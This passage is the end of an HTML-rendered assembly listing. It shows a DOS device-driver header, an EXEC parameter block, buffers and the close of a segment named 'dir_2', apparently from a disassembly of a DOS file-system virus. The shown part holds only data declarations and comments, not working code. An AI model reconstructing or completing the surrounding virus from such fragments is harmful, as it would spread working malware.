                                                </span><span class="sc1">;  DOS 3 OPEN/CLOSE removable</span><span class="sc0">
                                                </span><span class="sc1">;        media calls supported</span><span class="sc0">
                                                </span><span class="sc1">;  Generic IOCTL call supported</span><span class="sc0">
                                                </span><span class="sc1">; Supports 32 bit sectors</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">                      </span><span class="sc1">; Strategy routine</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rts</span><span class="sc0">                       </span><span class="sc1">; Interrupt routine (rtf)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7fh</span><span class="sc0">                              </span><span class="sc1">; Number of subunits supported</span><span class="sc0">
                                                </span><span class="sc1">; by this driver.  Wow, lookit</span><span class="sc0">
                                                </span><span class="sc1">; it -- it's so large and juicy</span><span class="sc0">

</span><span class="sc1">; Parameter block format:</span><span class="sc0">
</span><span class="sc1">; 0  WORD Segment of environment</span><span class="sc0">
</span><span class="sc1">; 2 DWORD pointer to command line</span><span class="sc0">
</span><span class="sc1">; 6 DWORD pointer to 1st default FCB</span><span class="sc0">
</span><span class="sc1">;10 DWORD pointer to 2nd default FCB</span><span class="sc0">
</span><span class="sc5">param</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">bpb_buf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">f_name</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">80</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;--------The End.</span><span class="sc0">
</span><span class="sc5">dir_2</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">

</span></div></body>
</html>
